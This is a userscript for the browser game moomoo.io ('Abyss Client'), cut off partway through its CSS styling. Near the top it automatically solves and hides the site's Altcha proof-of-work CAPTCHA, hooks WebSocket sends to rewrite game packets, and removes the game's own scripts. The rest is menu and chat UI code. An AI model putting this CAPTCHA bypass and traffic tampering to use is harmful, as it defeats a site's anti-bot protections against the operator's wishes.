// ==UserScript==
// @name         ! Abyss Client
// @description  epik
// @version      V5.4
// @license      CC BY-SA 4.0
// @author       Phalynx and Firaz
// @match        *://*.moomoo.io/*
// @icon         https://i.imgur.com/BmSVWPH.png
// @require     https://cdnjs.cloudflare.com/ajax/libs/msgpack-lite/0.1.26/msgpack.min.js
// @grant        none
// ==/UserScript==

var autoBreaking = false;
document.title = "Abyss Client";

const AbyssColors = {
  darkOutline: "#000000",
  background: "#000000",
  arrow: "#fff",
  PlayerBuildMark: "#8ecc51",
  TeamBuildMark: "#345eeb",
  EnemyBuildMark: "#cc5151",
};

if (
  window.location.hostname === "localhost" ||
  window.location.hostname === "127.0.0.1"
) {
  const stripServerParam = () => {
    if (/(^|[?&])server=/.test(window.location.search || "")) {
      try {
        window.history.replaceState(
          null,
          "",
          window.location.origin + window.location.pathname,
        );
      } catch (e) { }
    }
  };
  stripServerParam();
  setInterval(stripServerParam, 500);
}

const PACKET_MAP = {
  33: "9",
  7: "K",
  ch: "6",
  pp: "0",
  "13c": "c",
  f: "9",
  a: "9",
  d: "F",
  G: "z",
};

const instaReticle = new Image();
instaReticle.src = "https://i.imgur.com/msvee9i.png";

let clickedElements = {
  color: false,
};

const tryClickElements = () => {
  if (!clickedElements.color) {
    const colorElement = document.querySelector(
      "#skinColorHolder > div:nth-child(7)",
    );
    if (colorElement) {
      colorElement.click();
      console.log("Clicked skin color");
      clickedElements.color = true;
    }
  }

  if (!clickedElements.color) {
    setTimeout(tryClickElements, 500);
  }
};

setTimeout(tryClickElements, 1000);

(() => {
  const d = document,
    w = navigator.hardwareConcurrency || 8;
  d.head.appendChild(d.createElement("style")).innerHTML =
    "altcha-widget,#altcha{display:none!important;visibility:hidden!important}.altcha-toast{position:fixed;top:20px;right:20px;padding:10px 18px;border-radius:6px;font:600 14px/1.4 system-ui,sans-serif;color:#fff;z-index:999999;pointer-events:none;animation:altchaIn .2s ease,altchaOut .3s ease 2s forwards;box-shadow:0 4px 12px rgba(0,0,0,.3)}.altcha-toast--info{background:#3b82f6}.altcha-toast--success{background:#22c55e}.altcha-toast--error{background:#ef4444}@keyframes altchaIn{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:translateY(0)}}@keyframes altchaOut{to{opacity:0;transform:translateY(-10px)}}";
  const toast = (level, msg, { duration = 2e3, title = "", time } = {}) => {
    const t = d.createElement("div");
    t.className = `altcha-toast altcha-toast--${level}`;
    t.textContent = `${title ? title + ": " : ""}${msg}${time != null ? " (" + (time / 1e3).toFixed(2) + "s)" : ""}`;
    d.body.appendChild(t);
    setTimeout(() => t.remove(), duration + 300);
  };
  const notify = {
    info: (m, o) => toast("info", m, o),
    success: (m, o) => toast("success", m, o),
    error: (m, o) => toast("error", m, o),
  };
  let solving = false,
    lastSig = null;
  const workerCode = `importScripts('https://cdn.jsdelivr.net/npm/js-sha256@0.9.0/build/sha256.min.js');
onmessage=({data:{salt,challenge,start,end}})=>{
for(let i=start;i<=end;i++){
if(sha256(salt+i)===challenge)return postMessage({found:true,n:i});
}
postMessage({found:false});
};`;
  const blob = URL.createObjectURL(
    new Blob([workerCode], { type: "text/javascript" }),
  );
  const pool = Array.from({ length: w }, () => new Worker(blob));

  const solve = async (e) => {
    if (solving) return;
    let j = e.getAttribute("challengejson") || e.dataset?.challengejson;
    if (!j) {
      const u = e.getAttribute("challengeurl");
      if (!u || e.dataset?.f) return;
      try {
        new URL(u, location.href);
      } catch {
        return;
      }
      e.dataset.f = "1";
      try {
        const res = await fetch(u);
        if (!res.ok) {
          e.dataset.f = "0";
          return;
        }
        j = JSON.stringify(await res.json());
        e.setAttribute("challengejson", j);
      } catch {
        e.dataset.f = "0";
        return;
      }
      e.dataset.f = "0";
    }
    let p;
    try {
      p = JSON.parse(j);
    } catch {
      return;
    }
    if (!p.salt || !p.challenge || p.signature === lastSig) return;
    solving = true;
    notify.info("Solving...", { duration: 1500, title: "Altcha" });
    const t0 = performance.now(),
      max = parseInt(p.maxnumber) || 1e6,
      chunk = Math.ceil(max / w);
    try {
      const result = await new Promise((resolve, reject) => {
        let done = false,
          pending = w;
        pool.forEach((worker, i) => {
          const start = i * chunk,
            end = Math.min(max - 1, (i + 1) * chunk - 1);
          worker.onmessage = ({ data }) => {
            if (done) return;
            if (data.found) {
              done = true;
              resolve({ n: data.n, t: performance.now() - t0 });
            } else if (--pending === 0) reject(new Error("Not found"));
          };
          worker.postMessage({
            salt: p.salt,
            challenge: p.challenge,
            start,
            end,
          });
        });
      });
      const payload = btoa(
        JSON.stringify({
          algorithm: p.algorithm || "SHA-256",
          challenge: p.challenge,
          salt: p.salt,
          number: result.n,
          signature: p.signature,
          took: Math.round(result.t),
        }),
      );
      lastSig = p.signature;
      e.dispatchEvent(
        new CustomEvent("statechange", {
          bubbles: true,
          detail: { state: "verified", payload },
        }),
      );
      const inp =
        e.querySelector('input[name="altcha"]') ||
        d.querySelector('input[name="altcha"]');
      if (inp) {
        inp.value = payload;
        inp.dispatchEvent(new Event("input", { bubbles: true }));
      }
      notify.success("Solved", {
        duration: 1500,
        title: "Altcha",
        time: result.t,
      });
    } catch {
      notify.error("Failed", { title: "Altcha" });
    } finally {
      solving = false;
    }
  };
  const check = (n) => {
    if (n.id === "altcha" || n.tagName === "ALTCHA-WIDGET") solve(n);
    n.querySelectorAll?.("altcha-widget,#altcha").forEach(solve);
  };
  new MutationObserver((m) =>
    m.forEach((x) => x.addedNodes.forEach(check)),
  ).observe(d, { childList: true, subtree: true });
  new MutationObserver((m) =>
    m.forEach((x) => x.attributeName === "challengejson" && solve(x.target)),
  ).observe(d, {
    attributes: true,
    subtree: true,
    attributeFilter: ["challengejson"],
  });
  d.querySelectorAll("altcha-widget,#altcha").forEach(solve);
})();

let originalSend = WebSocket.prototype.send;

WebSocket.prototype.send = new Proxy(originalSend, {
  apply: (target, websocket, argsList) => {
    let decoded = msgpack.decode(new Uint8Array(argsList[0]));

    if (PACKET_MAP.hasOwnProperty(decoded[0])) {
      decoded[0] = PACKET_MAP[decoded[0]];
    }

    return target.apply(websocket, [msgpack.encode(decoded)]);
  },
});
(function () {
  const scriptSrc = "index-6b10514b.js";
  const scriptTags = document.querySelectorAll(`script[src*="${scriptSrc}"]`);
  if (scriptTags.length > 0) {
    scriptTags[0].remove();
  }
})();

(function () {
  const scriptSrc = "index-eb87bff7.js";
  const scriptTags = document.querySelectorAll(`script[src*="${scriptSrc}"]`);
  if (scriptTags.length > 0) {
    scriptTags[0].remove();
  }
})();

function isChatActive() {
  const active = document.activeElement;
  if (!active) return false;
  const id = active.id;
  return (
    id === "ChatInPut" ||
    id === "ChatSearch" ||
    id === "chatBox" ||
    id === "allianceInput"
  );
}

document.addEventListener("keydown", function (event) {
  if (isChatActive()) return;
  if (event.keyCode === 192) {
    const chatHolder = document.getElementById("gameUI");
    if (chatHolder) {
      const currentDisplay = chatHolder.style.display;
      chatHolder.style.display = currentDisplay === "none" ? "block" : "none";
    }
  }
});

function getEl(id) {
  return document.getElementById(id);
}

function loadScript(url, callback) {
  let script = document.createElement("script");
  script.src = url;
  script.onload = () => {
    console.log(`Successfully loaded script: ${url}`);
    if (callback) callback();
  };
  script.onerror = (error) => {
    console.error(`Failed to load script: ${url}`, error);
  };
  document.body.appendChild(script);
}

(function () {
  const scriptSrc = "index-6b10514b.js";
  const scriptTags = document.querySelectorAll(`script[src*="${scriptSrc}"]`);
  if (scriptTags.length > 0) {
    scriptTags[0].remove();
  }
})();

window.oncontextmenu = function () {
  return false;
};

let config = window.config || (window.config = {});
let recording;

config.clientSendRate = 9;
config.serverUpdateRate = 9;

config.deathFadeout = 0;

config.playerCapacity = 50;
window.config.maxPlayers = 50;

config.isSandbox =
  window.location.hostname == "sandbox.moomoo.io" ||
  "moomoo.io/?server=phalynx";

config.skinColors = [
  "#bf8f54",
  "#cbb091",
  "#896c4b",
  "#fadadc",
  "#ececec",
  "#c37373",
  "#000000",
  "#ecaff7",
  "#738cc3",
  "#8bc373",
  "#91b2db",
];

config.weaponVariants = [
  {
    id: 0,
    src: "",
    xp: 0,
    val: 1,
  },
  {
    id: 1,
    src: "_g",
    xp: 3000,
    val: 1.1,
  },
  {
    id: 2,
    src: "_d",
    xp: 7000,
    val: 1.18,
  },
  {
    id: 3,
    src: "_r",
    poison: true,
    xp: 12000,
    val: 1.18,
  },
  {
    id: 4,
    src: "_e",
    poison: true,
    heal: true,
    xp: 24000,
    val: 1.18,
  },
];
config.volcanoScale = 320;
config.innerVolcanoScale = 100;
config.volcanoAnimalStrength = 2;
config.volcanoAnimationDuration = 3200;
config.volcanoAggressionRadius = 1440;
config.volcanoAggressionPercentage = 0.2;
config.volcanoDamagePerSecond = -1;
config.volcanoLocationX = config.mapScale - config.volcanoScale - 120;
config.volcanoLocationY = config.mapScale - config.volcanoScale - 120;

config.anotherVisual = true;
config.useWebGl = false;
config.resetRender = true;

function waitTime(timeout) {
  return new Promise((done) => {
    setTimeout(() => {
      done();
    }, timeout);
  });
}

let canStore;
if (typeof Storage !== "undefined") {
  canStore = true;
}

function saveVal(name, val) {
  if (canStore) localStorage.setItem(name, val);
}

function deleteVal(name) {
  if (canStore) localStorage.removeItem(name);
}

function getSavedVal(name) {
  if (canStore) return localStorage.getItem(name);
  return null;
}

let gC = function (a, b) {
  try {
    let res = JSON.parse(getSavedVal(a));
    if (typeof res === "object") {
      return b;
    } else {
      return res;
    }
  } catch (e) {
    return b;
  }
};

window.removeConfigs = function () { };
window.changeMenu = function () { };
window.debug = function () { };
window.wasdMode = function () { };
window.startGrind = function () { };
window.resBuild = function () { };
window.toggleVisual = function () { };
window.prepareUI = function () { };
window.leave = function () { };

class HtmlAction {
  constructor(element) {
    this.element = element;
  }
  add(code) {
    if (!this.element) return undefined;
    this.element.innerHTML += code;
  }
  newLine(amount) {
    let result = `<br>`;
    if (amount > 0) {
      result = ``;
      for (let i = 0; i < amount; i++) {
        result += `<br>`;
      }
    }
    this.add(result);
  }
  checkBox(setting) {
    let newCheck = `<input type = "checkbox"`;
    setting.id && (newCheck += ` id = ${setting.id}`);
    setting.style &&
      (newCheck += ` style = ${setting.style.replaceAll(" ", "")}`);
    setting.class && (newCheck += ` class = ${setting.class}`);
    setting.checked && (newCheck += ` checked`);
    setting.onclick && (newCheck += ` onclick = ${setting.onclick}`);
    newCheck += `>`;
    this.add(newCheck);
  }
  text(setting) {
    let newText = `<input type = "text"`;
    setting.id && (newText += ` id = ${setting.id}`);
    setting.style &&
      (newText += ` style = ${setting.style.replaceAll(" ", "")}`);
    setting.class && (newText += ` class = ${setting.class}`);
    setting.size && (newText += ` size = ${setting.size}`);
    setting.maxLength && (newText += ` maxLength = ${setting.maxLength}`);
    setting.value && (newText += ` value = ${setting.value}`);
    setting.placeHolder &&
      (newText += ` placeHolder = ${setting.placeHolder.replaceAll(" ", "&nbsp;")}`);
    newText += `>`;
    this.add(newText);
  }
  select(setting) {
    let newSelect = `<select`;
    setting.id && (newSelect += ` id = ${setting.id}`);
    setting.style &&
      (newSelect += ` style = ${setting.style.replaceAll(" ", "")}`);
    setting.class && (newSelect += ` class = ${setting.class}`);
    newSelect += `>`;
    for (let options in setting.option) {
      newSelect += `<option value = ${setting.option[options].id}`;
      setting.option[options].selected && (newSelect += ` selected`);
      newSelect += `>${options}</option>`;
    }
    newSelect += `</select>`;
    this.add(newSelect);
  }
  button(setting) {
    let newButton = `<button`;
    setting.id && (newButton += ` id = ${setting.id}`);
    setting.style &&
      (newButton += ` style = ${setting.style.replaceAll(" ", "")}`);
    setting.class && (newButton += ` class = ${setting.class}`);
    setting.onclick && (newButton += ` onclick = ${setting.onclick}`);
    newButton += `>`;
    setting.innerHTML && (newButton += setting.innerHTML);
    newButton += `</button>`;
    this.add(newButton);
  }
  selectMenu(setting) {
    let newSelect = `<select`;
    if (!setting.id) {
      alert("please put id skid");
      return;
    }
    window[setting.id + "Func"] = function () { };
    setting.id && (newSelect += ` id = ${setting.id}`);
    setting.style &&
      (newSelect += ` style = ${setting.style.replaceAll(" ", "")}`);
    setting.class && (newSelect += ` class = ${setting.class}`);
    newSelect += ` onchange = window.${setting.id + "Func"}()`;
    newSelect += `>`;
    let last;
    let i = 0;
    for (let options in setting.menu) {
      newSelect += `<option value = ${"option_" + options} id = ${"O_" + options}`;
      setting.menu[options] && (newSelect += ` checked`);
      newSelect += ` style = "color: ${setting.menu[options] ? "#000" : "#fff"}; background: ${setting.menu[options] ? "#8ecc51" : "#cc5151"};">${options}</option>`;
      i++;
    }
    newSelect += `</select>`;

    this.add(newSelect);

    i = 0;
    for (let options in setting.menu) {
      window[options + "Func"] = function () {
        setting.menu[options] = getEl("check_" + options).checked
          ? true
          : false;
        saveVal(options, setting.menu[options]);
        getEl("O_" + options).style.color = setting.menu[options]
          ? "#000"
          : "#fff";
        getEl("O_" + options).style.background = setting.menu[options]
          ? "#8ecc51"
          : "#cc5151";
      };
      this.checkBox({
        id: "check_" + options,
        style: `display: ${i == 0 ? "inline-block" : "none"};`,
        class: "checkB",
        onclick: `window.${options + "Func"}()`,
        checked: setting.menu[options],
      });
      i++;
    }

    last = "check_" + getEl(setting.id).value.split("_")[1];
    window[setting.id + "Func"] = function () {
      getEl(last).style.display = "none";
      last = "check_" + getEl(setting.id).value.split("_")[1];
      getEl(last).style.display = "inline-block";
    };
  }
}
class Html {
  constructor() {
    this.element = null;
    this.action = null;
    this.divElement = null;
    this.startDiv = function (setting, func) {
      let newDiv = document.createElement("div");
      setting.id && (newDiv.id = setting.id);
      setting.style && (newDiv.style = setting.style);
      setting.class && (newDiv.className = setting.class);
      this.element.appendChild(newDiv);
      this.divElement = newDiv;

      let addRes = new HtmlAction(newDiv);
      typeof func == "function" && func(addRes);
    };
    this.addDiv = function (setting, func) {
      let newDiv = document.createElement("div");
      setting.id && (newDiv.id = setting.id);
      setting.style && (newDiv.style = setting.style);
      setting.class && (newDiv.className = setting.class);
      setting.appendID && getEl(setting.appendID).appendChild(newDiv);
      this.divElement = newDiv;

      let addRes = new HtmlAction(newDiv);
      typeof func == "function" && func(addRes);
    };
  }
  set(id) {
    this.element = getEl(id);
    this.action = new HtmlAction(this.element);
  }
  resetHTML(text) {
    if (text) {
      this.element.innerHTML = ``;
    } else {
      this.element.innerHTML = ``;
    }
  }
  setStyle(style) {
    this.element.style = style;
  }
  setCSS(style) {
    this.action.add(`<style>` + style + `</style>`);
  }
}

let HTML = new Html();

let menuDiv = document.createElement("div");
menuDiv.id = "menuDiv";
document.body.appendChild(menuDiv);
HTML.set("menuDiv");
HTML.setStyle(`
            position: absolute;
                display: none;
            left: 20px;
            top: 135px;
            `);
HTML.resetHTML();

const AB = {
  getDisplay: (id) => document.getElementById(id)?.style.display ?? "none",
  setStyle: (selectors, styles) => {
    const defaultTransition = "0.3s ease";
    selectors.forEach((selector, i) => {
      const elements = selector.startsWith(".")
        ? document.querySelectorAll(selector)
        : [document.getElementById(selector)];
      elements.forEach((el) => {
        if (!el) return;
        if (!el.style.transition || el.style.transition !== defaultTransition)
          el.style.transition = defaultTransition;
        for (const key in styles[i]) {
          if (el.style[key] !== styles[i][key]) el.style[key] = styles[i][key];
        }
      });
    });
  },
  styles: {
    animation: `#ageBarBody, #nameInput, #itemInfoHolder, #scoreDisplay, #mapDisplay, .menuButton, .skinColorItem, .menuHeader, .actionBarItem, .resourceDisplay, #topInfoHolder, .gameButton, #chatHolder, #chatBox, #allianceMenu, #allianceHolder, .allianceButtonM, #storeMenu, .storeTab, #storeHolder, .storeItem, #storeButton, #allianceButton, #leaderboard, #killCounter { transition: 0.3s; } @keyframes partyGradient { 0% { background-position: 0% 50%; } 100% { background-position: 200% 50%; } }`,
    NotiDisplay: `.NotiDisplayHolder { background: linear-gradient(180deg, #181818, #242424); border: 1px solid rgba(255,255,255,0.06); border-radius: 12px; padding: 14px 20px; font-size: 16px; font-weight: 700; font-family: Roboto, Arial, sans-serif; color: #E0E0E0; position: fixed; left: 50%; top: 20px; transform: translateX(-50%);z-index: 10000; opacity: 0; transition: opacity 0.4s ease, top 0.4s ease; box-shadow: 0 12px 30px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.04); max-width: 600px; box-sizing: border-box; } .NotiDisplayHolder2 { font-size: 20px; background-color: rgba(0, 0, 0, 0.3); box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5); border-radius: 8px; color: #fff; padding: 12px 16px; position: fixed; top: 20px; left: 20px; opacity: 0; z-index: 50; transition: opacity 0.6s ease, top 0.4s ease; } .NotiDisplayHolder.show, .NotiDisplayHolder2.show { opacity: 1; } `,
    Custom: `#ageBar, .gameButton, #leaderboard, .resourceDisplay, #mapDisplay, #allianceHolder, #allianceInput, .allianceButtonM, #storeHolder, #ChatBodyBox, .storeTab, #chatBox, .actionBarItem, #PlayerLogBoard, .uiElement {  background-color: rgba(0, 0, 0, 0.25); box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5); border-radius: 8px; } .actionBarItem { background-size: cover; background-position: center; border-radius: 10px; } #ageBar { margin-bottom: 5px; } #leaderboard { width: 230px } #foodDisplay, #woodDisplay, #stoneDisplay, #killCounter, #scoreDisplay { line-height: 30px; background-size: 32px; background-position: center top 5px; padding: 30px 10px 0 10px; font-size: 20px; } #foodDisplay { bottom: 160px } #woodDisplay { bottom: 90px } `,
    Chat: `#chat { opacity: 0; visibility: hidden; transition: opacity .30s ease, visibility 0s linear .30s; } #chat.active { opacity: 1; visibility: visible; pointer-events: auto; transition: opacity .30s ease; } #chat, #chat * { scroll-behavior: auto !important; } #chat .ChatPane, #chat .ChatLine { overflow-anchor: none; } #ChatBodyBox { user-select: none; box-sizing: border-box; position: fixed; left: 20px; top: 20px; width: 460px; height: 320px; background: linear-gradient(180deg, rgba(18,18,18,.92), rgba(10,10,10,.86)); border: 1px solid rgba(255,255,255,.10); border-radius: 16px; z-index: 999; overflow: hidden; will-change: opacity; opacity: 0; transition: opacity .30s ease; } #chat.active #ChatBodyBox { opacity: 1; } #chat.active.idle #ChatBodyBox { opacity: 0; } #chat.active.wake #ChatBodyBox { opacity: 1; } #chat.wake #ChatInPut, #ChatBodyBox:hover #ChatInPut, #ChatInPut:focus { opacity: 1; } #ChatTabs { position: absolute; top: 0; left: 0; right: 0; height: 46px; padding: 4px 10px 0; display: flex; justify-content: flex-end; gap: 7px; z-index: 5; background: rgba(0,0,0,.18); border-bottom: 1px solid rgba(255,255,255,.06); box-sizing: border-box; } .ChatTab { position: relative; width: 34px; height: 34px; border-radius: 10px; display: flex; align-items: center; justify-content: center; cursor: pointer; user-select: none; background: rgba(255,255,255,.06); border: 1px solid rgba(255,255,255,.07); color: rgba(255,255,255,.75); transition: .18s transform, .18s background, .18s border-color, .18s color, .18s box-shadow; box-shadow: 0 6px 14px rgba(0,0,0,.35); } .ChatTab i, .ChatTab .material-icons { font-size: 18px !important; line-height: 1; pointer-events: none; } .ChatTab:hover { transform: scale(1.06); background: rgba(255,255,255,.10); color: #fff; } .ChatTab.active { background: rgba(155,92,255,.16); border-color: rgba(155,92,255,.42); color: #EDE7FF; box-shadow: 0 0 0 3px rgba(155,92,255,.12), 0 10px 20px rgba(0,0,0,.40); } .ChatTab[data-tip] { position: relative; } .ChatTab[data-tip]::after { content: attr(data-tip); position: absolute; left: 50%; top: 42px; transform: translateX(-50%) translateY(-6px); font-size: 11px; font-weight: 900; letter-spacing: .10em; text-transform: uppercase; padding: 6px 10px; border-radius: 12px; background: rgba(0,0,0,.82); border: 1px solid rgba(255,255,255,.08); color: rgba(255,255,255,.92); opacity: 0; pointer-events: none; white-space: nowrap; transition: opacity .16s ease, transform .16s ease; z-index: 10; } .ChatTab[data-tip]::before { content: ""; position: absolute; left: 50%; top: 36px; transform: translateX(-50%); width: 0; height: 0; border-left: 6px solid transparent; border-right: 6px solid transparent; border-bottom: 6px solid rgba(0,0,0,.82); opacity: 0; pointer-events: none; transition: opacity .16s ease; z-index: 10; } .ChatTab:hover::after { opacity: 1; transform: translateX(-50%) translateY(0); } .ChatTab:hover::before { opacity: 1; }.ChatTab .badge { position: absolute; right: -10px; top: -6px; min-width: 22px; height: 18px; border-radius: 999px; display: none; align-items: center; justify-content: center; font-size: 10px; font-weight: 900; line-height: 1; color: #fff; background: #9B5CFF; border: 1px solid rgba(0,0,0,.35); box-shadow: 0 6px 14px rgba(0,0,0,.45); } .ChatTab.hasNew .badge { display: flex; } .ChatTab.hasNew { box-shadow: 0 0 0 3px rgba(155,92,255,.10), 0 10px 20px rgba(0,0,0,.40); } #ChatMessagesWrap { position: absolute; left: 0; right: 0; top: 46px; bottom: 58px; padding: 8px 10px; box-sizing: border-box; } .ChatPane { position: absolute; inset: 0 0 0 10px; box-sizing: border-box; padding: 2px 2px 0; overflow-y: auto; overflow-x: hidden; } .ChatPane.isHidden { opacity: 0; visibility: hidden; pointer-events: none; } .ChatPane::-webkit-scrollbar { width: 6px; } .ChatPane::-webkit-scrollbar-thumb { background: rgba(185,135,255,.35); border-radius: 10px; border: 1px solid rgba(255,255,255,.06); } .ChatPane::-webkit-scrollbar-thumb:hover { background: rgba(185,135,255,.55); } #ChatInPut { position: absolute; left: 10px; right: 10px; bottom: 10px; height: 40px; padding: 8px 10px; font-size: 16px; color: #ddd; background: rgba(35,35,35,.88); border: 1px solid rgba(255,255,255,.10); border-radius: 12px; outline: none; opacity: 0; transition: opacity .25s ease, border-color .2s ease, background .2s ease, box-shadow .2s ease; box-sizing: border-box; } #ChatInPut:focus { border-color: rgba(155,92,255,.60); background: rgba(45,45,45,.95); } .ChatLine { margin: 4px 0; padding: 4px 6px; border-radius: 6px; color: rgba(255,255,255,.95); font-size: 14px; line-height: 1.34; background: transparent; border-left: 2px solid rgba(155,92,255,.75); opacity: 1; transform: none; will-change: transform, opacity; transition: background .12s ease; } .ChatLine:hover { background: rgba(255,255,255,.03); } .ChatLine.isNew { opacity: 0; transform: translateY(8px) scale(0.995); animation: chatIn .22s cubic-bezier(.2,.9,.2,1) forwards; } @keyframes chatIn { to { opacity: 1; transform: translateY(0) scale(1); } } .ChatLine .ts { margin-right:6px; opacity:.55; font-weight:700; font-size:12px; letter-spacing:.02em; } .ChatLine .msg { opacity:.95; } .ChatLine .x{ margin-left:6px; opacity:.7; font-weight:900; font-size:12px; } #ChatSearch { height:34px; width:160px; padding:0 10px; border-radius:10px; background:rgba(255,255,255,.06); border:1px solid rgba(255,255,255,.07); color:rgba(255,255,255,.88); outline:none; } #ChatSearch::placeholder { color:rgba(255,255,255,.35); } #ChatSearch:focus { border-color:rgba(155,92,255,.45); } .ChatLine.isFiltered { display:none; } .ChatLine mark { background:rgba(155,92,255,.20); color:inherit; padding:0 2px; border-radius:4px; }`,
    Logs: `#PlayerLog { position: relative; opacity: 1; pointer-events: none; transition: opacity 0.5s ease-out; } #PlayerLogBoard { position: fixed; right: 20px; top: 20px; color: #fff; font-size: 31px; text-align: left; padding: 10px; width: 220px; background-color: rgba(0, 0, 0, 0.25); border-radius: 4px; transform: translateX(100%); opacity: 0; transition: transform 0.5s ease-out, opacity 0.5s ease-out; } #PlayerLogBoard.active { transform: translateX(0%); opacity: 1; } .PlayerLogHolder { overflow: hidden; white-space: nowrap; } .PlayerLogitems { color: #fff; display: inline-block; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; font-size: 18px; }`,
    Menu: `#z-menu { position: fixed; top: 50%; left: 50%; width: 920px; max-width: 95%; height: 680px; max-height: 90%; transform: translate(-50%, -50%) scale(0.975); background: linear-gradient(180deg, #181818, #242424); border-radius: 24px; color: #E0E0E0; font-family: 'Roboto', Arial, sans-serif; font-size: 16px; opacity: 0; pointer-events: none; border: 1px solid rgba(255,255,255,0.05); transition: transform 0.3s cubic-bezier(0.25, 0.8, 0.25, 1), opacity 0.3s ease; z-index: 9999; overflow: hidden; will-change: transform, opacity; } #z-menu.open { opacity: 1; pointer-events: auto; transform: translate(-50%, -50%) scale(1); } .z-menu-body { display: flex; height: calc(100% - 85px); } .z-content { flex: 1; padding: 20px; overflow-y: auto; font-size: 16px; line-height: 1.5; background: #0f0f0f; border-radius: 0 0 12px 0; } .z-page { display: none; } .z-page.active { display: block; } #z-menu .z-content { overflow-y: auto; padding-right: 8px; } #z-menu .z-content::-webkit-scrollbar { width: 6px; } #z-menu .z-content::-webkit-scrollbar-track { background: transparent; margin: 4px 0; } #z-menu .z-content::-webkit-scrollbar-thumb { background: rgba(155,92,255,0.6); border-radius: 10px; border: 1px solid rgba(255,255,255,0.05); box-shadow: 0 0 4px rgba(155,92,255,0.4); transition: all 0.3s; } #z-menu .z-content::-webkit-scrollbar-thumb:hover { background: rgba(185,135,255,0.8); box-shadow: 0 0 8px rgba(185,135,255,0.6); } #z-menu .z-content { scrollbar-width: thin; scrollbar-color: rgba(155,92,255,0.6) transparent; } .z-menu-header { height: 85px; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; border-bottom: 1px solid rgba(100,100,100,0.2); background: rgba(15,15,15,0.95); font-weight: 800; color: #9B5CFF; text-shadow: 0 0 6px rgba(155,92,255,0.8); box-shadow: 0 2px 6px rgba(0,0,0,0.5); } .z-title-container { display: flex; flex-direction: column; justify-content: center; } .z-title { font-size: 36px; font-weight: 900; letter-spacing: 0.005em;background: linear-gradient(90deg, #9B5CFF 0%, #B987FF 65%);-webkit-background-clip: text;-webkit-text-fill-color: transparent; text-shadow: 0 1px 5px rgba(155,92,255,0.28); line-height: 1.04; } .z-sec-title { margin: 14px 4px 10px; font-size: 14px; font-weight: 900; letter-spacing: .10em; text-transform: uppercase; color: rgba(255,255,255,0.75);background: linear-gradient(90deg, rgba(155,92,255,.28) 0%, rgba(155,92,255,.08) 55%, transparent 85%);padding: 6px 10px;border-radius: 10px; border-left: 3px solid #9B5CFF;user-select: none; } .z-subtitle { font-size: 14px; color: rgba(255,255,255,0.55); letter-spacing: 0.04em; line-height: 1; } .z-header-right { display: flex; align-items: center; gap: 8px; } .z-iconbtn{ width:34px;height:34px;border-radius:10px; display:flex;align-items:center;justify-content:center; background:rgba(25,25,25,.9); border:1px solid rgba(155,92,255,.25); color:rgba(255,255,255,.85); cursor:pointer; transition:.2s transform,.2s border-color,.2s background; user-select:none; } .z-iconbtn:hover{ transform:scale(1.06); border-color:#9B5CFF; background:rgba(155,92,255,.10); } .z-iconbtn.active{ border-color:#B987FF; color:#B987FF; box-shadow:0 0 10px rgba(155,92,255,.20); } .z-search-input { padding: 6px 12px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.2); background: rgba(30,30,30,0.9); color: #E0E0E0; font-size: 14px; outline: none; transition: all 0.25s; width: 180px; } .z-search-input:focus { background: rgba(155,92,255,0.1); border-color: #9B5CFF; box-shadow: 0 0 6px rgba(155,92,255,0.4); } .z-close { cursor: pointer; font-size: 28px; opacity: 0.75; transition: opacity 0.25s, transform 0.25s; } .z-close:hover { opacity: 1; transform: scale(1.2); } .z-sidebar { width: 200px; background: linear-gradient(180deg,#121212,#1c1c1c); border-right: 1px solid rgba(100,100,100,0.2); padding: 12px; display: flex; flex-direction: column; gap: 12px; } .z-tab { display: flex; align-items: center; gap: 12px; padding: 10px 12px; border-radius: 12px; cursor: pointer; opacity: 0.85; font-weight: 600; font-size: 16px; transition: all 0.3s; position: relative; } .z-tab i { width: 34px; height: 34px; border-radius: 10px; background: #161616; border: 1px solid rgba(255,255,255,0.06); color: rgba(255,255,255,0.65); display: flex; align-items: center; justify-content: center; transition: background 0.2s ease, border-color 0.2s ease, color 0.2s ease, transform 0.15s ease; } .z-tab:hover i { background: #1c1c1c; color: #ffffff; transform: translateX(1px); } .z-tab.active i { background: #0f2530; border-color: #9B5CFF; color: #9B5CFF; } .z-tab::before { content: ""; position: absolute; left: -6px; top: 8px; bottom: 8px; width: 3px; border-radius: 2px; background: transparent; transition: background 0.35s ease; } .z-tab.active::before { background: #9B5CFF; } .z-tab.active { background: rgba(155,92,255,0.15); color: #fff; font-weight: 700; box-shadow: inset 0 0 12px rgba(155,92,255,0.35); } .z-tab.active i { color: #fff; background: rgba(155,92,255,0.25); box-shadow: 0 0 12px rgba(155,92,255,0.45); } .z-tab:hover { transform: translateX(3px); opacity: 1; } .z-tab-text { display: flex; flex-direction: column; line-height: 1.1; } .z-tab-title { font-size: 15px; font-weight: 600; } .z-tab-desc { font-size: 11px; opacity: 0.55; transition: opacity 0.3s; } .z-tab:hover .z-tab-desc, .z-tab.active .z-tab-desc { opacity: 0.85; } .z-option { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; margin-bottom: 12px; border-radius: 14px; background: rgba(30,30,30,0.85); border: 1px solid rgba(255,255,255,0.08); transition: all 0.3s; box-shadow: 0 2px 6px rgba(0,0,0,0.3); } .z-option:hover { background: rgba(155,92,255,0.08); } .z-option i { font-size: 22px; margin-right: 12px; color: #9B5CFF; flex-shrink: 0; display: flex; align-items: center; justify-content: center; width: 36px; height: 36px; border-radius: 6px; background: linear-gradient(145deg, #1a1a1a, #111111); border: 2px solid rgba(155,92,255,0.3); transition: all 0.25s ease; } .z-option:hover i { border-color: #B987FF; background: linear-gradient(145deg, #222222, #0f0f0f); } .z-option-text { display: flex; flex-direction: column; justify-content: center; flex: 1; overflow: hidden; } .z-option-title { font-size: 15px; font-weight: 600; color: #E0E0E0; } .z-option-desc { font-size: 12px; color: rgba(255,255,255,0.6); white-space: nowrap; text-overflow: ellipsis; overflow: hidden; } .z-checkbox { width: 46px; height: 24px; border-radius: 20px; background: #222; position: relative; cursor: pointer; transition: background 0.25s; flex-shrink: 0; } .z-checkbox::after { content: ""; width: 20px; height: 20px; background: #888; border-radius: 50%; position: absolute; top: 2px; left: 2px; transition: transform 0.25s, background 0.25s; } .z-checkbox.active { background: rgba(155,92,255,0.4); } .z-checkbox.active::after { 